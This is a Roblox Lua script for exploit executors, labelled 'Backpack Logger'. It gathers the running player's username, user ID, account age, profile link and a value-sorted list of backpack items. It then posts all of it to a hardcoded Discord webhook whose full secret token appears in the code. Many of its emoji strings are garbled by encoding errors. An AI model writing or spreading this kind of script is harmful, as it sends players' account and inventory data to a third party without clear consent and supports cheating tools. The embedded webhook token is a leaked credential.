local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- Improved number parsing that handles malformed inputs
local function safeParseNumber(str, default)
    if type(str) == "number" then return str end
    if type(str) ~= "string" then return default end
    
    -- Extract first number found in string (handles cases like "0.0t KG")
    local numStr = string.match(str, "[%d%.]+") or ""
    local num = tonumber(numStr) or default
    return num
end

-- Number formatting with commas
local function formatNumberWithCommas(n)
    local num = math.floor(safeParseNumber(n, 0))
    return tostring(num):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
end

local player = Players.LocalPlayer
local userId = player.UserId
local playerName = player.Name
local accountAge = player.AccountAge
local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"

-- Backpack collection with robust error handling
local backpack = player:WaitForChild("Backpack")
local backpackItems = {}
for _, item in ipairs(backpack:GetChildren()) do
    -- Safely get all attributes
    local rawWeight = item:GetAttribute("Weight") or "0"
    local rawAge = item:GetAttribute("Age") or "1"
    local rawValue = item:GetAttribute("Value") or "0"
    
    -- Parse numbers safely
    local weight = safeParseNumber(rawWeight, 0)
    local age = safeParseNumber(rawAge, 1)
    local value = safeParseNumber(rawValue, 0)
    
    -- Clean weight display (remove any non-numeric characters)
    local cleanWeight = string.format("%.2f", weight):gsub("[^%d%.]", "")
    
    -- Format the item display
    local itemName = item.Name
    if item:GetAttribute("IsCelestial") then
        itemName = "[Celestial] " .. itemName
    end
    
    -- Handle special item states (like [Wet, Shocked])
    local states = {}
    if item:GetAttribute("Wet") then table.insert(states, "Wet") end
    if item:GetAttribute("Shocked") then table.insert(states, "Shocked") end
    
    local statePrefix = #states > 0 and "["..table.concat(states, ", ").."] " or ""
    
    table.insert(backpackItems, {
        text = string.format("%s%s [%.2f KG] [Age %d] ‚Üí %s#", 
            statePrefix, itemName, weight, age, formatNumberWithCommas(value)),
        value = value
    })
end

-- Sort by value descending
table.sort(backpackItems, function(a, b)
    return a.value > b.value
end)

-- Prepare final display
local backpackDisplay = {}
for _, item in ipairs(backpackItems) do
    table.insert(backpackDisplay, item.text)
end

local backpackStr = #backpackDisplay > 0 and table.concat(backpackDisplay, "\n") or "Kosong"

-- Discord webhook setup (unchanged from previous version)
local webhookUrl = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"

-- Select request function based on executor
local requestFunction = (syn and syn.request) or (fluxus and fluxus.request) or 
                       (krnl and krnl.request) or (http_request or request)

if not requestFunction then
    warn("‚ùå Executor tidak mendukung HTTP request.")
    return
end

local function safeRequest(options)
    local success, result = pcall(requestFunction, options)
    return success and result or nil
end

-- Create Discord embed
local embed = {
    title = "üì¶ Informasi Backpack dan Akun",
    color = 0x3498db,
    fields = {
        {name = "üë§ Player", value = string.format("`%s` (ID: `%d`)", playerName, userId), inline = true},
        {name = "‚è≥ Umur Akun", value = string.format("%d hari", accountAge), inline = true},
        {name = "üîó Profile Roblox", value = string.format("[Klik Disini](%s)", profileUrl), inline = false},
        {name = "üéí Isi Backpack", value = "```\n" .. backpackStr .. "\n```", inline = false}
    },
    footer = {
        text = "Backpack Logger - " .. os.date("%Y-%m-%d %H:%M:%S"),
        icon_url = "https://i.imgur.com/Z4VbQXz.png"
    },
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

-- Send to Discord
local response = safeRequest({
    Url = webhookUrl,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode({
        username = "üéí Backpack Logger",
        avatar_url = "https://i.imgur.com/0y0F0Gj.png",
        embeds = {embed}
    })
})

if response and (response.StatusCode == 204 or response.StatusCode == 200) then
    print("‚úÖ Webhook Discord berhasil dikirim!")
else
    warn("‚ùå Gagal mengirim webhook:", response and response.StatusCode or "No response")
end
